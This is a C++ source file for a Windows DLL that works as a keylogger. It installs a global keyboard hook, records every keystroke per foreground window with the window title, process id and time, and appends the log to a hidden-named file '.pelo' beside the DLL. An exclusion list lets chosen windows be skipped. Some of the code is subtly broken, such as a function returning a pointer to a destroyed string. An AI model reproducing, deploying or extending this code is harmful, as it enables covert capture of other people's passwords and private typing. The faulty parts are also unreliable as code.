#include "pch.h"
#include "Pell.h"
#include "window_manager.h"
#include "keyboard_tracer.h"
#include <thread>
#include <fstream>
#include <string>
#include <atlstr.h>
#include <time.h>

#pragma data_seg(".sharedata")
HHOOK hHook = 0;
HANDLE hSharedMem = 0;
HOOKPROC hHookProc = 0;
int windowChangeCnt = 0;
HWND hWnd = 0;
#pragma data_seg()
HINSTANCE hInst;
bool isHooking;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hInst = (HINSTANCE)hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

#pragma region Export DLL 
extern "C" __declspec(dllexport) void init()
{
	initialize();
}

extern "C" __declspec(dllexport) void setWindowHandle()
{
	hWnd = GetForegroundWindow();
}


extern "C" __declspec(dllexport) void startHook(int m_maxKeyCnt)
{
	if (hWnd == NULL)
	{
		std::cout << "[!!!] window handle is null. fail to start hook" << std::endl;
		return;
	}

	keyLogInfo* info = getKeyLogSharedMemory(windowChangeCnt);
	if (info == NULL)
	{
		std::cout << "[!!!] fail making shared memory" << std::endl;
	}
	initKeyLogInfo(info);

	hHookProc = (HOOKPROC)hookProc;
	hHook = SetWindowsHookEx(WH_KEYBOARD, hHookProc, hInst, 0);

	if (hHook == NULL)
	{
		std::cout << "[!!!] hook is null. fail to start hook" << std::endl;
		return;
	}

	isHooking = true;
	std::cout << "[*] successfull, start hook." << std::endl;
	return;
}

extern "C" __declspec(dllexport) bool pauseHook()
{
	isHooking = false;
	hHookProc = NULL;
	return UnhookWindowsHookEx(hHook);
}

extern "C" __declspec(dllexport) bool endHook()
{
	for (int i = 0; i <= windowChangeCnt; i++)
	{
		hSharedMem = setKeyLogSharedMemory(i);
		printKeyLog(i);
		writeKeyLog(i);
		refreshKeyLogSharedMemory(i);
		CloseHandle(hSharedMem);
	}
	std::cout << "[*] finish keyboard hook." << std::endl;
	isHooking = false;
	return UnhookWindowsHookEx(hHook);
}

extern "C" __declspec(dllexport) bool getHooking()
{
	return isHooking;
}


extern "C" __declspec(dllexport) bool isCurrentWindowEnableHook()
{
	char check[128];
	std::string path = "";
	getDllPath(path);
	path += "/unablehook.data";
	std::ifstream ifs(path);
	if (ifs.fail())
	{
		return false;
	}

	HWND hWndNow = GetForegroundWindow();
	char winName[128];
	GetWindowTextA(hWndNow, winName, 128);

	// std::cout << "winName " << winName << std::endl;
	while (ifs.getline(check, 128))
	{
		// std::cout << "check " << check << std::endl;
		if (strstr(winName, check) != NULL) { return false; }
	}
	hWnd = hWndNow;
	return true;
}

extern "C" __declspec(dllexport) int isChangeWindow()
{
	if (hWnd == GetForegroundWindow())
	{
		return 1;
	}
	else
	{
		return 0;
	}
}
#pragma endregion

void initialize()
{
	hWnd = GetForegroundWindow();
	if (hWnd == NULL)
	{
		std::cout << "[!!!] fail to set Window handle." << std::endl;
	}
	else
	{
		isHooking = false;
		std::cout << "[*] set Window handle." << std::endl;
	}
}

LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
	{
		return CallNextHookEx(0, nCode, wParam, lParam);
	}
	int fUp = 0x40000000 & lParam;
	if (nCode == HC_ACTION && !fUp)
	{
		HWND hWndNow = GetForegroundWindow();
		if (hWnd != hWndNow)
		{
			hWnd = hWndNow;
			windowChangeCnt++;
			keyLogInfo* info = getKeyLogSharedMemory(windowChangeCnt);
			initKeyLogInfo(info);
			info->wp[info->keyCnt] = wParam;
			info->keyCnt++;
		}
		else
		{
			keyLogInfo* info = getKeyLogSharedMemory(windowChangeCnt);
			if (MAX_KEY_COUNT > info->keyCnt)
			{
				info->wp[info->keyCnt] = wParam;
				info->keyCnt++;
			}
		}
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

LPCTSTR getSharedMemoryName(int id)
{
	std::string msg = KEY_LOG_MEMORY;
	msg += std::to_string(id);
	CString s(msg.c_str());
	LPCTSTR name = s;
	return name;
}

HANDLE setKeyLogSharedMemory(int windowCnt)
{
	int size = sizeof(keyLogInfo);
	return setSharedMemory(size, getSharedMemoryName(windowCnt));
}

keyLogInfo* getKeyLogSharedMemory(int windowCnt)
{
	int size = sizeof(keyLogInfo);
	return getSharedMemory<keyLogInfo>(size, getSharedMemoryName(windowCnt));
}

HANDLE setSharedMemory(int size, LPCTSTR name)
{
	HANDLE ret = CreateFileMapping(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		NULL,
		size,
		name);
	return ret;
}

template<typename T> T* getSharedMemory(int size, LPCTSTR name)
{
	hSharedMem = setSharedMemory(size, name);
	if (hSharedMem == 0) { return NULL; }
	T* pMem = (T*)MapViewOfFile(
		hSharedMem,
		FILE_MAP_WRITE,
		0,
		0,
		size);
	return pMem;
}

void initKeyLogInfo(keyLogInfo *info)
{
	refreshKeyLogSharedMemory(info);
	GetWindowTextA(hWnd, info->title, TITLE_SIZE);
	GetWindowThreadProcessId(hWnd, &info->pid);
	info->keyCnt = 0;
	time_t t = time(NULL);
	struct tm tM;
	errno_t err_t = localtime_s(&tM, &t);
	/*if (err_t != NULL)
	{*/
		int year = tM.tm_year + 1900;
		int mon = tM.tm_mon + 1;
		int day = tM.tm_mday;
		int hour = tM.tm_hour;
		int min = tM.tm_min;
		info->time[0] = tM.tm_year + 1900;
		info->time[1] = tM.tm_mon + 1;
		info->time[2] = tM.tm_mday;
		info->time[3] = tM.tm_hour;
		info->time[4] = tM.tm_min;
	//}
}

void printKeyLog(int windowId)
{
	keyLogInfo* info = getKeyLogSharedMemory(windowId);
	KeyboardTracer* tracer = new KeyboardTracer();
	if (info != NULL)
	{
		std::cout << "NO." << windowId << " KEY LOG INFO WINDOW {" << std::endl;
		std::cout << "  title: " << info->title << std::endl;
		std::cout << "  time: " << info->time[0] << "." << info->time[1] << "." 
			<< info->time[2] << " " << info->time[3] << ":" << info->time[4] << std::endl;
		std::cout << "  pid: " << info->pid << std::endl;
		std::cout << "  keyCnt: " << info->keyCnt << std::endl;
		std::string key_log = "";
		for (int i = 0; i < info->keyCnt; i++)
		{
			key_log += tracer->transVirtualKey(info->wp[i]);
		}
		std::cout << "  keylog: " << key_log << std::endl;
		std::cout << "}" << std::endl;

		UnmapViewOfFile(info);
	}
	delete tracer;
}

void writeKeyLog(int windowId)
{
	std::ofstream outputfile;
	std::string path_str = "";
	getDllPath(path_str);
	path_str += "/.pelo";

	outputfile.open(path_str, std::ios::app);
	keyLogInfo* info = getKeyLogSharedMemory(windowId);
	KeyboardTracer* tracer = new KeyboardTracer();
	if (info != NULL)
	{
		outputfile << "NO." << windowId << " KEY LOG INFO WINDOW {" << std::endl;
		outputfile << "  title: " << info->title << std::endl;
		outputfile << "  time: " << info->time[0] << "." << info->time[1] << "."
			<< info->time[2] << " " << info->time[3] << ":" << info->time[4] << std::endl;
		outputfile << "  pid: " << info->pid << std::endl;
		outputfile << "  keyCnt: " << info->keyCnt << std::endl;
		std::string key_log = "";
		for (int i = 0; i < info->keyCnt; i++)
		{
			key_log += tracer->transVirtualKey(info->wp[i]);
		}
		outputfile << "  keylog: " << key_log << std::endl;
		outputfile << "}" << std::endl;

		UnmapViewOfFile(info);
	}
	outputfile.close();
	delete tracer;
}

void getDllPath(std::string &path_str)
{
	char path[MAX_PATH];
	int size = sizeof(path) / sizeof(path[0]);
	GetModuleFileNameA(hInst, path, size);
	for (int i = 0; i < size; i++)
	{
		path_str += path[i];
	}
	int pos = path_str.rfind("dll");
	path_str = path_str.substr(0, pos);
	pos = path_str.rfind("\\");
	path_str = path_str.substr(0, pos);
}

void refreshKeyLogSharedMemory(keyLogInfo* info)
{
	*info->title = NULL;
	info->pid = NULL;
	info->keyCnt = NULL;
	for (int i = 0; i < MAX_KEY_COUNT; i++)
	{
		info->wp[i] = NULL;
	}
}

void refreshKeyLogSharedMemory(int windowId)
{
	keyLogInfo* info = getKeyLogSharedMemory(windowId);
	*info->title = NULL;
	info->pid = NULL;
	info->keyCnt = NULL;
	for (int i = 0; i < MAX_KEY_COUNT; i++)
	{
		info->wp[i] = NULL;
	}
}

void myMessageBox(std::string str)
{
	int len = strlen(str.c_str());
	wchar_t t[128] = L"";
	for (int i = 0; i < len; i++)
	{
		t[i] = str[i];
	}
	MessageBoxW(hWnd, t, TEXT("click"), MB_OK);
}

